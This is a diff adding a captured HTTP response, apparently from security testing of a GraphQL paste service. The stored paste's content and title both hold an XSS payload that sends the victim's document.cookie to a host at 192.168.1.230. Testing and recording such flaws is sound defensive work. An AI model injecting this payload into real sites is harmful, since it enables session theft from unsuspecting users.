@@ -1,0 +1,7 @@
+HTTP/2 200 OK
+Content-Type: application/json
+Date: Tue, 01 Sep 2026 12:41:21 GMT
+Ngrok-Agent-Ips: X
+Content-Length: 255
+
+{"data":{"createPaste":{"paste":{"id":"21","content":"<script>fetch(`http://192.168.1.230/?c=${document.cookie}`, {mode:'no-cors'})</script>","title":"<script>fetch(`http://192.168.1.230/?c=${document.cookie}`, {mode:'no-cors'})</script>","burn":false}}}}
